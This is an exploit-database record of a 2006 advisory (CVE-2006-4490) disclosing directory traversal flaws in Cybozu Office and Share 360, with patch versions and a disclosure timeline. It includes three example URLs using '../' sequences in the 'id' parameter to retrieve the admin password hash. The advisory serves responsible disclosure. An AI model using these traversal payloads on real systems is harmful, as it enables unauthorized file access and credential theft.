{
  "id": "2266",
  "title": "Cybozu Products - &#039;id&#039; Arbitrary File Retrieval",
  "cve": "CVE-2006-4490",
  "vuln_type": "unknown",
  "code": "Cybozu Products Arbitrary File Retrieval Vulnerability\r\n\r\nby Tan Chew Keong\r\nRelease Date: 2006-08-28\r\n\r\nSummary\r\n\r\nA vulnerability has been found in Cybozu Products. When exploited, the vulnerability allows \r\nan authenticated user to retrieve arbitrary files accessible to the web server process.\r\n\r\nTested Versions\r\n    * Cybuzu Office Version 6.5 (Build 1.2 20050427121735) for Windows\r\n    * Cybozu Share 360 Version 2.5 (Build 0.2 20050121115231) for Windows\r\n\r\n\r\nDetails\r\n\r\nThis advisory discloses a directory traversal vulnerability in Cybozu products.\r\n1) Cybozu Office File Cabinet File Download Directory Traversal\r\n\r\nCybuzu Office does not properly validate the \"id\" parameter in \"/scripts/cbag/ag.exe\" before \r\nusing it to retrieve files from the file cabinet for a logon user. This allows a malicious user \r\nto retrieve arbitrary files accessible to the web server process using directory traversal characters.\r\n\r\nExample (to retrieve the password hash of the admin page):\r\n\r\nhttp://192.168.1.64/scripts/cbag/ag.exe?page=FileDownload&id=../../../../../../../../../../../../../inetpub/scripts/cbag/cb5/data/admin&notimecard=1&type=text&subtype=html&ct=1\r\n \r\n\r\n2) Cybozu Share 360 File Cabinet and Message Attachment Download Directory Traversal\r\n\r\nCybuzu Share 360 does not properly validate the \"id\" parameter in \"/scripts/s360v2/s360.exe\" \r\nbefore using it to retrieve files from the file cabinet and to retrieve file attachments from a \r\nreceived message/memo. This allows a malicious user to retrieve arbitrary files accessible to the \r\nweb server process using directory traversal characters.\r\n\r\nExample (to retrieve the password hash of the admin page):\r\n\r\nhttp://192.168.1.64/scripts/s360v2/s360.exe?page=FileDownload&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&type=text&subtype=plain&ct=1&.txt\r\n\r\nhttp://192.168.1.64/scripts/s360v2/s360.exe?page=MessageDownload&mid=37&id=../../../../../../../../../../inetpub/scripts/s360v2/s360v2/data/admin&bc=1&type=text&subtype=plain&ct=1&.txt\r\n \r\n\r\nPatch / Workaround\r\n\r\nCybuzu Office:\r\nUpdate to Version 6.6 (Build 1.3).\r\n\r\nCybozu Share 360:\r\nUpdate to Version 2.5 (Build 0.3).\r\n\r\nReferences\r\n\r\nhttp://cybozu.co.jp/products/dl/notice_060825/\r\n\r\nDisclosure Timeline\r\n\r\n2006-07-04 - Vulnerability Discovered.\r\n2006-07-13 - Initial Vendor Notification.\r\n2006-07-13 - Initial Vendor Reply.\r\n2006-07-14 - Received scheduled patch release date from vendor.\r\n2006-08-16 - Received notification that patch release will be delayed.\r\n2006-08-25 - Vendor released patch information on website.\r\n2006-08-28 - Public Disclosure.\r\n\r\nContact\r\nFor further enquries, comments, suggestions or bug reports, simply email them to \r\nTan Chew Keong (chewkeong[at]vuln[dot]sg)\r\n\r\n# milw0rm.com [2006-08-28]",
  "url": "https://www.exploit-db.com/exploits/2266"
}